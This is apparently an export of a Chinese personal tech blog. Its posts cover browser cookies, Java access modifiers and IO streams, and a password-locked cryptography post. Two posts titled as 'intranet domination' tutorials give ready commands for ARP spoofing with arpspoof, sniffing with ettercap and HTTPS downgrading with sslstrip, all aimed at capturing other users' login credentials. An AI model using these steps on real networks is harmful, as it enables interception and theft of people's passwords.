<h6 id="2-1-4-Cookie的工作原理"><a href="#2-1-4-Cookie的工作原理" class="headerlink" title="2.1.4 Cookie的工作原理 "></a><font color="#008B45" face="楷体"><strong>2.1.4 Cookie的工作原理</strong> </font></h6><p><font face="仿体">&emsp;Cookie利用网页代码中的HTTP头信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。例如：当你在浏览器地址栏中键入了Amazon的URL，浏览器会向Amazon发送一个读取网页的请求，并将结果在显示器上显示。在发送之前，该网页在你的电脑上寻找Amazon网站设置的Cookie文件，如果找到，浏览器会把Cookie文件中的数据连同前面输入的URL一同发送到Amazon服务器。服务器收到Cookie数据，就会在他的数据库中检索你的ID，你的购物记录、个人喜好等信息，并记录下新的内容，增加到数据库和Cookie文件中去。如果没有检测到Cookie或者你的Cookie信息与数据库中的信息不符合，则说明你是第一次浏览该网站，服务器的CGI程序将为你创建新的ID信息，并保存到数据库中。（此例子来源于百度百科——Cookie）</font></p>
<hr>
<hr>
<h6 id="2-1-5-关于Cookie的一些知识点"><a href="#2-1-5-关于Cookie的一些知识点" class="headerlink" title="2.1.5 关于Cookie的一些知识点 "></a><font color="#008B45" face="楷体"><strong>2.1.5 关于Cookie的一些知识点</strong> </font></h6><p><font face="仿体">&emsp;1、Cookie是基于浏览器的，因此当电脑上安装多个浏览器时，服务器会生成多个Cookie。虽然是同一个人，但服务器是识别为多个用户。<br>&emsp;2、Cookie是基于浏览器的，因此当同一台电脑有多个人使用时，服务器也只会生成一个Cookie。虽然是多个人，但服务器会认为是一个用户。<br>&emsp;3、Cookie是无法跨设备进行设置的。比如我们在单位和家里分别使用两台电脑，即使我们使用同一种同一版本的浏览器，我们还是生成了两个Cookie，服务器会认为是两个用户。（PS：现在有些浏览器可以同步数据，比如Chrome、Friefox，可以避免这种问题）<br><font color="red">请注意：以上所说的Cooke指的全部是Http Cookie。有一种Cookie——Flash Cookie，可以解决多浏览器的问题</font></font></p>
<hr>
<hr>
<h6 id="2-1-6-关于Flash-Cookie"><a href="#2-1-6-关于Flash-Cookie" class="headerlink" title="2.1.6 关于Flash Cookie "></a><font color="#008B45" face="楷体"><strong>2.1.6 关于Flash Cookie</strong> </font></h6><p><font face="仿体">&emsp;FlashCookie是由FlashPlayer控制的客户端共享存储技术，鉴于目前Flash技术的普遍性，几乎所有的网站都采用，所以具有同Http Cookie一样的作用。在技术上，通过使用JavaScript与ActionScript可以将Http Cookie和Flash Cookie进行互通。<br>Flash cookie的优势在于：<br>1、跨浏览器<br>不管用户的计算机上安装了多少个浏览器或者浏览器的不同版本，使用Flash Cookie能够使所有的浏览器共用一个Cookie。<br>2、不易删除<br>所有的浏览器均提供了清除Http Cookie的快捷方式，但Flash Cookie并没有此种方式，并且其保存位置非常隐蔽，网民难以删除。<br>3、容量更大<br>Flash Cookie可以容纳最多100千字节的数据，而一个标准的HTTP Cookie只有4千字节。</font></p>
<hr>
<hr>
<h6 id="2-1-7-Cookie的数量"><a href="#2-1-7-Cookie的数量" class="headerlink" title="2.1.7 Cookie的数量 "></a><font color="#008B45" face="楷体"><strong>2.1.7 Cookie的数量</strong> </font></h6><p><font face="仿体">&emsp;1、大多数浏览器支持最大为 4096 字节的 Cookie。因此最好用 Cookie 来存储用户 ID 之类的标识符，用户的详细信息则通过用户 ID从数据库或其他数据源中读取。<br>&emsp;2、浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；当存储更多 Cookie时，最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie 总数作出绝对限制，通常为 300 个。 </font></p>
<hr>
<hr>
<h6 id="2-1-8-Cookie的失效时间"><a href="#2-1-8-Cookie的失效时间" class="headerlink" title="2.1.8 Cookie的失效时间 "></a><font color="#008B45" face="楷体"><strong>2.1.8 Cookie的失效时间</strong> </font></h6><p><font face="仿体">&emsp;1、浏览器的Cookie设置会决定是否保存Cookie数据。如果浏览器不允许Cookie保存，则关掉浏览器后，这些数据就消失。<br>&emsp;2、如果浏览器允许保存Cookie，那么Cookie的时间由服务器的设置决定。Cookie有一个Expires（有效期）属性，这个属性决定了Cookie的保存时间，服务器可以通过设定Expires字段的数值，来改变Cookie的保存时间。如果不设置该属性，那么Cookie只在浏览网页期间有效，关闭浏览器，这些Cookie自动消失，绝大多数网站属于这种情况。通常情况下，Cookie包含Server、Expires、Name、value这几个字段，其中对服务器有用的只是Name和value字段，Expires等字段的内容仅仅是为了告诉浏览器如何处理这些Cookies。 </font></p>
<hr>
<hr>
<p>参考：<a href="https://blog.csdn.net/u012195214/article/details/78889602">《【总结】浏览器 User-Agent 大全》</a>、<a href="https://blog.csdn.net/xinyuan_java/article/details/66092335">《User-Agent详解》</a>.<br>&ensp;<br>&ensp;<br>&ensp;<br>&ensp;</p>
]]></content>
      <categories>
        <category>HTTP协议</category>
      </categories>
      <tags>
        <tag>User-Agen</tag>
        <tag>Cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>内网称霸之《HTTP账号密码获取》</title>
    <url>/post/HTTP-password/</url>
    <content><![CDATA[<p>⭐<strong>使用工具：arpspoof、ettercap</strong><br><font face="楷体"><strong>ettercap是什么？</strong></font></p>
<blockquote>
<blockquote>
<p>我们在对WEB安全检测的时候都会用到Cain和netfuke这两款工具，功能相信用过的朋友多多少少都知道，但这两款工具是在windows下运行的。<br>而ettercap是在linux下运行的 。其实功能都是差不多的，我称呼它为嗅探工具，ARP欺骗，DNS，劫持，中间人攻击等等。总之这是一款强大的安全测试工具。</p>
</blockquote>
</blockquote>
<h4 id="一、ARP欺骗"><a href="#一、ARP欺骗" class="headerlink" title="一、ARP欺骗"></a>一、ARP欺骗</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 目标IP 目标主机网关</span><br></pre></td></tr></table></figure>
<h4 id="二、使用ettercap获取HTTP账号和密码"><a href="#二、使用ettercap获取HTTP账号和密码" class="headerlink" title="二、使用ettercap获取HTTP账号和密码"></a>二、使用ettercap获取HTTP账号和密码</h4><p><font face="楷体">另开一个终端，输入ettercap -Tq -i eth0</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<p>-T:文本模式<br>q:安静模式<br>i:指定网卡<br>成功后当靶机浏览HTTP网页试用账号和密码登陆时，这个终端窗口就会显示相应的url、账号、密码。<br>💛💙❤注意：当对方的用户名是使用中文登陆的，则终端窗口账号处显示的是编码，则需要使用到url解码，将这串编码解码成中文。</p>
</blockquote>
</blockquote>
<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>Kali-内网称霸</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>内网称霸之《HTTPS账号密码获取》</title>
    <url>/post/HTTPS-password/</url>
    <content><![CDATA[<p>⭐<strong>使用工具：arpspoof、ettercap、sslstrip</strong></p>
<h4 id="一、将HTTPS转换成HTTP"><a href="#一、将HTTPS转换成HTTP" class="headerlink" title="一、将HTTPS转换成HTTP"></a>一、将HTTPS转换成HTTP</h4><table><tr><td bgcolor=#D1EEEE>在获取HTTPS账号、密码的操作前需要修改ettercap的设置，否则无法成功。
1.先编辑/etc/ettercap/etter.conf下的文件内容，更改ettercap设置；
1.1输入/etc/ettercap/etter.conf后找到：
# if you use iptables:
#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
这个地方
2.改为（去掉两个#）：
# if you use iptables:
redir_command_on = "iptables <font color="red">-t</font> nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
redir_command_off = "iptables <font color="red">-t</font> nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
3.输入sslstrip -a -f -k 实现https转换成http以获取帐号密码；
4.在该终端窗口下右键选择“复制SSH渠道(S)”；
5.接着直接使用HTTP账号密码获取的方法就可以了。
</td></tr></table>

<blockquote>
<blockquote>
<p>vim使用方法：<br>编辑：按下i；<br>保存并退出：按下Esc，然后按Shift和：(冒号)，按下wq，完后按回车；<br>不保存并退出：按下Esc，然后按Shift和：(冒号)，按下q!，完后按回车；</p>
</blockquote>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ettercap/etter.conf</span><br><span class="line">i</span><br><span class="line">删除两个<span class="comment">#</span></span><br><span class="line">Esc、Shift ：、wq、回车</span><br><span class="line">sslstrip -a -f -k</span><br></pre></td></tr></table></figure>
<h4 id="二、ARP欺骗和抓包获取HTTPS账号和密码"><a href="#二、ARP欺骗和抓包获取HTTPS账号和密码" class="headerlink" title="二、ARP欺骗和抓包获取HTTPS账号和密码"></a>二、ARP欺骗和抓包获取HTTPS账号和密码</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 目标IP 目标主机网关</span><br><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure>
<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>Kali-内网称霸</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>Hash函数和消息认证</title>
    <url>/post/Hash-Message-Authentication/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="21582bc57520078ec50f35a23f99147a6145ff8b7cc4653afeb4ba972cf75446">c8a6ea5f1e651a923da793e6131165195edca5e224eb04f8de211bd01e36a458404a312c92f198af16b815cf746e31e418df468f332f57ad407065a720ab50332e0ded5d198e59f3dfae1048f687f80dfc9fce7607586bd280bcb5c9da09491d601fc9b4cbebb6e4d5428e597030eeb1e67330b4c9c0f39529a405164c28323195ac009dc4126e0b69c9dfca429c9032dd6083ea866b42be907f69da735a35534d0f7aaa7cad8b67c9bfc42d07de4e60e2c6aca64324d5934ca33dd1bdecda4b21d70c940fcc614866ecbf19f167b5ba07586b69cc1857ebf2d9647378b0189b4ca186a04bd99ec0774915e978ebbd820696fcaeb5505999ae71f178d1c1fa2201fffbc7e885bf112a1d70e42bd2d6febca983f17084b61f6a74407f63c9282c6950925dca5bfc9dc736c5fe55c3b241b953ac25b18c4d2e779cd009fea876624dd509cbaaf8ecd078fca4a11845e824e16861126500dcffba62e7f02b012a4eae3054d75800d5a0d297638ff852080b0a413954541034f0b0345a0b325802858553c9d10bca14ff31e856baae85f82fea36e9018b5fed564513b19e7295bcfa5f28b53613e1220f4c16601cf5798c881518d0b3f2fbde26f967d10762e5797db69032c7344f926e6322e3e35454f33cd81d97254e24edea44f7f311200b62abf41a3f4a227efe8c3c6d3b9d729c48162d6077a292dcbc633a4ea5323234e56d5d7a3af69d6f95a68c896859a6984dddc9328b265142569484ee763233b35d4c992f08820e7bebdd10663d899d542925ded0271a862c149d1268ca88f7e3c144bf0b3eb5b0af3ec3687f230fd626d22d68f5ed3008a71152ca6b1b0763226c172526034a7fb2ea730fde18d02aef53e22e6004ea3c90ca72f55edc3324891c7150f8e7bbf5a4c57eabf612eeb31b7604102bce4f23dbe766458ee05b9fef8127d369c2a7211cb73c0e1f1b768963cd2fe5f22f28b7c4256c51599343c3ae07787a28ca3f87a3ea76975b99465886bab5cc60091395b61f846f18548389db0001fb1571294cb7bdeb81afb299732251b69c887e2c5cdaef9e8fa883b00121f8c3aec2ef4fbf0e254ab5c1a96c16213aa2fef747e47ed582783eff5d740058f328611385dda401f3639b0dcc9e91ad6b103122d48badd00771e9ea2fd90fb84cba0cb240cc2284af4f084ee30cd456b8bf37028ef01f91c535cf79c21f6774b15b5ea5393d1545a215af1b4a83b572f6e5810cf8609141c004026c40e072aafd398d821a4bd0c084e29cf5eb55756744e7152a4ba4e69c32880727ce6df2b2f34204de7875d3d91211d26b48ff494f3e665247bf9a4e1b44e882d018ee1192069faf65f0396e78dc05aefebd53ff9dc3a00f32665cf475491b46fe806b13b53c70677c1e901144da8e8761f57b315d9ac963ac8526bed5df1ceaae0a3201712fb27572592b7fdfbd89e0b8d2f6a1faae3e6634f5c45bc77daf8b8c02e3b73c0a2f596ff71338b4cf871e3f70114cbf5d7a22d952f90b2999217353e1190c637513bc0cf0253a070a9e5de1e2d62d9b0f3b00ac55fcfa4faf294d1eed892809c53cb9385a305bb84c345169a65893276795b2423f18cd5496594126c41640c438d0054a4188b521b96ba63b0d3052e51a349eff9d579ed0a951faca0b77e99e73d5f65d2abd9fa391344e0034e2767e999bccd3650c75d6f3dca519c1879a4f446bb5d2cf4cb05d076c8bd124741e9bd9828e1762e740017ec59b2176a65e168b0e041ec3c80aea36c6a08c6036fce0e529dbe2388c4ab5f2585e8f9ce9a778fe81190b91ec633910e7560ee3220b8ae0096ad5635ae9e23a235f1f5fb7a133f7b900df31fefb2f34e8e81027c95b4e7a4dfa113d523d1440e5fdd4f4ade9308ec169426ac817a2f60908e487168b337a5b11010ce620f9838a7124ead32e7f58e51a7e2125414dcc6cbbdab51fb2531eee71a78cf746d119241f117a2371ad458dc4218760a1a596495dc0f5a57ebb9dbc94297cfda64180f7a2f84e549da81836a07038d5efd5c53ba072239e83f2471e602d49a3bc66977b29197aa74a6d9906883275f19de17e607760c17ee37c91e8b591187cce1a9e1cf2e10e1e0d4b32fa9d366d955366ca048730011dbf114dceedd44e05ec845d9ed0d04bb28f239083b8dad9b58e83aa9830693c45d7e33bbf9b01753ca35074b3060b9d9d4bc2a16c071d1ff3eddff1d254fb77b5167e190f82632b1c05a12440eb58eb96ec89cad3a9af32910d17577f50651203030abe94c738fad40c5d3cc76090f64de53f672dfebf58dd1339fae3f2b69843146374673b419febd0dbbca08784e6f9acef2f94ea70d8935f0c8b5ec247af5561492a90d4a68a98f3bd3f4c2b86efb8de8eb4a0b4546736dec7efbafbca4391aae2db46a6d1203e9ad63c106f847128458d5b812fda7442ec6c7c0c6b0d55d2db86239f9c81dce1b1bfb6991ccf904ac3bc1206f0a361276ff49c7fce5cf175f6d5c0db56e5fa5bdfc8d2cd6ba543612a82ccddfa76d1d761d89f4c4c6c6f4671dd16e19e01c420a6fc66cd1725d38c13e6959705c00a103ed526e483428372d44e8582aadb69ca7d3ce86af482121369667b6ed2eec8cac0dadd5d75f846e76e38647434fb6a28c9f918c3cc457dce8c1179b7853f64d630a6a40f05bc95cfd3708da8e788ae74d3e112ccb2e7673f90a883aa7fc67b676337b33bf7c9dbbbf5b6413c90238c97b01063950440241e38655652809aacf58dbb89e57bc25fb3dfe1697531d1b387b0f6d9bda294643595d89e478e3d22a2309aa8dcfbdbe3faf8846fb8a83a2dc8552923c669480a457789e4be7c0fe4b16864aed3d93e9c959d80240410e696fbeddc5780830cda9543319a5aa3ebb022a1c109d20278820c77b76bf41aa57ee8353fc4ea5dbd5c4912611bc7c1a7e9a3cfacf3484b79ccfd74c149dfbf9a227adb7ba9e8a93bf42ba144b92ed638d511f08643b9c653e43b0429daa335684b843347a34a09903d95f746a232a14b33fcf4a2a1e060abac7d508cc1219433d8aac37093b87d7b66118695724bda3f26274e15ffaed16d1aae0014e9a5316a15dfcf26fff268705c4ab16ac80d95db0eab58e96b165ba8d518f0685140e671a8cc9ed3f19eaf5dd9c22b8340967d9af5255e45ad1db53aa0a078a7f6eae6d6ee1c252ea0aed814ce6e8d6695e1420e5cfecec9e0f96c5d49c9491a1173941490658fb919522207bbcb4cb98c9d610dade8c822f12567631d15f8d3a047177e3cafdfe52af3726b2282aef7c94b52e1f188c00455455b42ce40038909b01fe51636abf7017a49fd03b43e491773e518f65f3d4b932f5f02f4e9f176ffe7b09e7b4aa93c1fa4757398f7d14f6b87a5144aa8140937ecfcce9aa3d6fb3c636bb01e369d4d2162e574c0bffb15e4cb79981fcbf6ccca9944522925af75f0c11d86558f6872957b16664a817306fe6f64c816b4e392c72e8ae2f95d0689c240a6f1005f63fc8226653cc3b3fa6130997f8b805a1e9fb4453f0a3ff57ad8ade2dbb03fbe703205e2524d4e144600078fd719e56c01908e17931a1f203d7bd41c6ce3dc04e9edd8cd68adba2b8fa4257fc394e5d1dd28f54ac83aa3e97431e7110b3359aeb32f4acf99cda161c3a781fda12cc4901630d9e24491c261ca92b52523ae0c3f1b06215a6a00791709bdc2d4f11ab159918d7d87b26165df002603e6089e8e64b18e3683ff0e72b2d46d0b49a00de2140aaecf04201b7205e260368463a5c8b53643c6eb0f4020ae896e443a1cc454e5fdd2051b1240b9c60b06f7d3cbb218b704f6dc5452da0ab87b8c7ab31ce0b8c8dd3b6178e97598c6984d0612df24e725a98f3b9b2229d20512e662920089276ce2a8228a9e826afef253b7527cae1e9486740f28f377f418dac3e6849ebb60fb5c041e644c87a9f8af376dd6254bcc076e1bcb33447efbb303a87f5501f00281c34c09d5f0da155e008f8eb21c5791b9a01fd9fecb8cfda71793034e6198f2dd7bd7650e28d8c6ea0a3aae1084b7e309059aa4ea8913a7b588247917e029c46e06ef36e5b2b18a55ad88dbc093c15228b06090f5fba0987f9476c2cfb78a56c2c1aab03d8640add3d14733447d9429fc94d99441b1f1f32c1ea402cc4f30622eb55724279e1395a4d4784f309aad107fe77cdf1bb0d47194f5d40a10f4981c252b1961b8a00f9f19056c2502e15b8b7a9d88287f3cd13126f72802d01cf66fbed18d0ee92ec329976876fef309e24cb60f08ce0b9c49be4a2b801c0c00468cfbb63115eede5af8646ad20290585a524374a930295204b1a91a35c1e0b82550847784350c047b1a4ded662bd3134793caeb9f014b38eb178e67066b54d197741d15f1aed5ef2d4f84106624d2cbd19ed59773bb562e347c9894cd7da1f55ecefb089886a07f2b2faa4c502599f82561ba881fbd6e0b76e0266240d424bcf4f49cf8dde58e732d3ca7b601b4033d250f7cf97e728d32a0d2fa28556a14693eab5c8ae67176b8d8a80c17ecd6ae27cb30a8f1845d1c95a3e556a4866bd6849376515b61f647eee6ab9f7bfc8778859d3595d99246bb75337ba975eee5ba74a0e1152c7b2cc2ebd9c863e8c32e0b806e2418908f00e94e12cf3dabbff4add1eb1a689d56902373dc95cae9f6c285fc74723693e91d2909ac499bc2a519668b6dc85bcf61a24ac863b65739dc4bca3ab2b578c1b27987c82d72436ae21a98aea20fb1f75a211586144496ca32c1d61416def881b126e632246ae2bfa550fe08b5dca6ba322179bc63faa6ac456d9816cba85346d0e60ac2132496ef6a18fa0912b141aef82a149331fc7d7acac3ad87917bb4b526132c20bddf60a62349285fe6bc552062b567476b41ec74a29e75958db0547f7ef56ce3e79974c12f08dc1dac1d2548a622b70bced98f947dcfd49e6544bf08f1906ae1759b65190bda316a717028a818929aa2392adc2fcaf024e7736403c6424bd83c8da76a4ab08152c0a30f6bccd54386f740482e9b2f0d089a6c7df5beaa537b11dfe040bccdae8e4c23ef2921c3f929625bdd37e5af8a44c75d1e83b0786ce2ce18265072651f78f4f8d4fb7015c72fd4dbc17c820a367294712c566b1fd16d784fae27d9ef29cd201764c5e3f6c2aa5f63dc790d094ee9df06b28feb0dda3258c46cdd15049cba9d2af936724c3f1f35797e35906779f1b150cd01b331cb5300dad944d3046f369905e78eea1d9ee5c1228a61b073b50db71eebd28214a7deaab180f302d1ce38f4ec1c9fa65b4ac6e88094083eabd232d4ebbb26363cd89b558a82c354c64a66f846b231610a6316b26621371dfaa1b763901fc31d7bb1e9bed97f14df8c36d483b1c3d2458f69232e17ce9e267b7bf3c24b51139059129b2630df7701a7ef6b0be545ef16607a71f127dc8264080c27</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>Hash函数</tag>
      </tags>
  </entry>
  <entry>
    <title>Java类、成员变量、static访问权限(4.1-4.4)</title>
    <url>/post/Java-Access-Permissions-3/</url>
    <content><![CDATA[<p>&ensp;<br>&ensp;</p>
<h4 id="一、-Java中类的定义、类访问权限"><a href="#一、-Java中类的定义、类访问权限" class="headerlink" title="一、 Java中类的定义、类访问权限"></a><font color="#FF6347" face="Comic sans MS">一、 Java中类的定义、类访问权限</font></h4><h5 id="1-1-类的定义格式："><a href="#1-1-类的定义格式：" class="headerlink" title="1.1  类的定义格式："></a><font color="#3CB371" face="Comic sans MS">1.1  类的定义格式：<font></h5><p><font color="red"><strong>[修饰符] class 类名 [extends父类名] [implements接口名列表]</strong></font><br>&emsp;<br>&emsp;<br><img data-src="https://i.loli.net/2018/12/24/5c1fb67d13ec7.png" alt="1"></p>
<p>&emsp;</p>
<h5 id="1-2-类修饰符的访问权限："><a href="#1-2-类修饰符的访问权限：" class="headerlink" title="1.2  类修饰符的访问权限："></a><font color="#3CB371" face="Comic sans MS">1.2  类修饰符的访问权限：<font></h5><table>
<thead>
<tr>
<th>类修饰符</th>
<th>访问权限</th>
</tr>
</thead>
<tbody><tr>
<td><font color="#EE3A8C" face="Arial">缺省(默认方式)</font></td>
<td><font face="Comic sans MS" color="#EE3A8C">这种类只能被同一个包中的类访问；</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">public(公共)</td>
<td><font face="Comic sans MS" color="#EE3A8C">它修饰的类能被所有的类访问；</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">abstract(抽象)</td>
<td><font face="Comic sans MS" color="#EE3A8C"> 它修饰的类不能被实例化，它可能包含有未实现的方法。</td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">extends(继承)</td>
<td><font face="Comic sans MS" color="#EE3A8C">该保留字用来表明新创建的类继承哪个类, 被继承的类称为此类的父类。extends后面只能跟一个父类名称, 因为Java中一个类最多能继承一个类(单继承)。</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">final(最终)</td>
<td><font face="Comic sans MS" color="#EE3A8C"> 它修饰的类不能被继承，即不能有子类。</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">implements (实现)</td>
<td><font face="Comic sans MS" color="#EE3A8C">该保留字用来表明这个类实现了哪些接口，接口名可以有多个。</td>
</tr>
</tbody></table>
<p>&emsp;</p>
<h5 id="1-3-关于类访问权限的总结："><a href="#1-3-关于类访问权限的总结：" class="headerlink" title="1.3  关于类访问权限的总结："></a><font color="#3CB371" face="Comic sans MS">1.3  关于类访问权限的总结：<font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">1.    具有继承关系的子类可以继承父类的一些成员变量，即可以不创建对象就可以直接访问，如果是
      同一个包的子类可以继承到public、缺省和protected修饰的变量，如果是不同的包的子类就只能继承
      到public 和protected的；
2.    如果是其他类，不管是一个包还是不在一个包，都要创建该类的对象才能引用
3.    如果是main方法，不管是本类还是非本类，要访问实例变量都要创建对象，可以引申到其他所有
       的类方法中
4.    私有成员只能在本类中访问，如果在main方法中访问私有成员 必须创建对象</font></td></tr></table>

<p>&ensp;<br>&ensp;</p>
<h4 id="二、-成员变量访问权限"><a href="#二、-成员变量访问权限" class="headerlink" title="二、 成员变量访问权限"></a><font color="#FF6347" face="Comic sans MS">二、 成员变量访问权限</font></h4><p>&ensp;<br><img data-src="https://i.loli.net/2018/12/24/5c1fbf2618e79.png" alt="2"></p>
<p>&ensp;<br>&emsp;</p>
<h5 id="2-1-成员变量访问权限总结为："><a href="#2-1-成员变量访问权限总结为：" class="headerlink" title="2.1  成员变量访问权限总结为："></a><font color="#3CB371" face="Comic sans MS">2.1  成员变量访问权限总结为：<font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**(1) 访问修饰符缺省**
访问修饰符缺省时，成员变量只能被同一包(package) 中的所有类访问，所以也称为包(package)变量。
(缺省访问修饰符实际是friendly修饰符，但因为friendly不是Java语言的关键字，所以friendly修饰符
不能显式说明。）
**(2) public(公共)**
public修饰的成员变量可以被程序中的任何类所访问。由于public成员变量不受限制, 这易使类的对象引起
不希望的修改，建议成员变量尽量不要使用public修饰符。
**(3) protected (受保护)**
protected修饰的成员变量可以被本包及有继承关系的类自由访问。
**(4) private (私有)**
private修饰的成员变量只能在同一个类中使用。这种方式通常是最为安全的。
</font></td></tr></table>

<p>&ensp;<br>&ensp;</p>
<h4 id="三、-static-静态-——静态变量访问权限"><a href="#三、-static-静态-——静态变量访问权限" class="headerlink" title="三、 static(静态)——静态变量访问权限"></a><font color="#FF6347" face="Comic sans MS">三、 static(静态)——静态变量访问权限</font></h4><table><tr><td bgcolor=#ADD8E6>(1)<font color="green">**static修饰的成员变量称为**</font><font color="#1874CD">**类变量(静态变量)**</font>；<font color="green">**不用static修饰的成员变量又叫**</font><font color="#1874CD">**对象变量(实例变量)。**</font>
(2)<font color="red">**区别：</font>**对象变量依附于具体的对象实例，它的值因具体对象实例的不同而不同，而类变量为该类的所有
对象所共享，它的值不因类的对象不同而不同。
(3)可以通过类来访问静态成员变量，也可以通过该类的对象访问静态成员变量。
&ensp;&ensp;<font color="red">**形式：类名.成员变量/对象名.成员变量**</font>
(4)<font color="red">**反过来，非staic的对象方法可以直接使用static的类变量**</font>
(5)类方法不能直接调用类中的对象方法（非static方法）。
(6)定义变量时必须当即赋值。
</td></tr></table>

<p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java访问权限</tag>
      </tags>
  </entry>
  <entry>
    <title>Java的输入输出</title>
    <url>/post/Java-IO-1/</url>
    <content><![CDATA[<h4 id="一、Java中的流的概念"><a href="#一、Java中的流的概念" class="headerlink" title="一、Java中的流的概念"></a><font color="#EE3A8C" face="楷体">一、Java中的流的概念</font></h4><h5 id="1-0-数据流的概念"><a href="#1-0-数据流的概念" class="headerlink" title="1.0 数据流的概念"></a><font color="#EE3A8C" face="楷体">1.0 数据流的概念</font></h5><blockquote>
<blockquote>
<p><font face="楷体">&emsp;数据流是一串连续不断的数据的集合，就象水管里的水流，在水管的一端一点一点地供水，而在水管的另一端看到的是一股连续不断的水流。数据写入程序可以是一段、一段地向数据流管道中写入数据，这些数据段会按先后顺序形成一个长的数据流。对数据读取程序来说，看不到数据流在写入时的分段情况，每次可以读取其中的任意长度的数据，但只能先读取前面的数据后，再读取后面的数据。不管写入时是将数据分多次写入，还是作为一个整体一次写入，读取时的效果都是完全一样的。<br>&emsp;“流是磁盘或其它外围设备中存储的数据的源点或终点。”<br>在电脑上的数据有三种存储方式，一种是外存，一种是内存，一种是缓存。比如电脑上的硬盘，磁盘，U盘等都是外存，在电脑上有内存条，缓存是在CPU里面的。外存的存储量最大，其次是内存，最后是缓存，但是外存的数据的读取最慢，其次是内存，缓存最快。这里总结从外存读取数据到内存以及将数据从内存写到外存中。对于内存和外存的理解，我们可以简单的理解为容器，即外存是一个容器，内存又是另外一个容器。那又怎样把放在外存这个容器内的数据读取到内存这个容器以及怎么把内存这个容器里的数据存到外存中呢？<br>&emsp;在Java类库中，IO部分的内容是很庞大的，因为它涉及的领域很广泛:<br>标准输入输出，文件的操作，网络上的数据流，字符串流，对象流，zip文件流等等，java中将输入输出抽象称为流，就好像水管，将两个容器连接起来。将数据冲外存中读取到内存中的称为输入流，将数据从内存写入外存中的称为输出流。<br>流是一个很形象的概念，当程序需要读取数据的时候，就会开启一个通向数据源的流，这个数据源可以是文件，内存，或是网络连接。类似的，当程序需要写入数据的时候，就会开启一个通向目的地的流。</font></p>
</blockquote>
</blockquote>
<pre><code>  以上总结的基本概念如下：</code></pre>
<table><tr><td bgcolor=#F5FFFA><font face="楷体">🌸数据流：一组有序，有起点和终点的字节的数据序列。包括输入流和输出流;
🌸输入流(Input  Stream)：程序从输入流读取数据源。数据源包括外界(键盘、文件、网络…)，即是将数据源读入到程序的通信通道;
🌸输出流：程序向输出流写入数据。将程序中的数据输出到外界（显示器、打印机、文件、网络…）的通信通道。采用数据流的目的就是使得输出输入独立于设备。
Input  Stream不关心数据源来自何种设备（键盘，文件，网络）
Output  Stream不关心数据的目的是何种设备（键盘，文件，网络）
🌸数据流分类：流序列中的数据既可以是未经加工的原始二进制数据，也可以是经一定编码处理后符合某种格式规定的特定数据。因此Java中的流分为两种：
 1)  字节流：数据流中最小的数据单元是字节；
 2)  字符流：数据流中最小的数据单元是字符，Java中的字符是Unicode编码，一个字符占用两个字节。
🌸具体的字节流和字符流区分请看文章《Java:字节流和字符流（输入流和输出流）》和[《Java 字节流与字符流的区别》](https://blog.csdn.net/qq_25184739/article/details/51203733)、[《理解Java中字符流与字节流的区别》](https://www.cnblogs.com/absfree/p/5415092.html)、[《Java:字节流和字符流（输入流和输出流）》](https://www.cnblogs.com/progor/p/9357676.html).
</font></td></tr></table>

<p>&nbsp;</p>
<h4 id="二、System、in、out说明"><a href="#二、System、in、out说明" class="headerlink" title="二、System、in、out说明"></a><font color="#EE3A8C" face="楷体">二、System、in、out说明</font></h4><p><font face="楷体">Java系统自带的标准数据流：java.lang.System:</font></p>
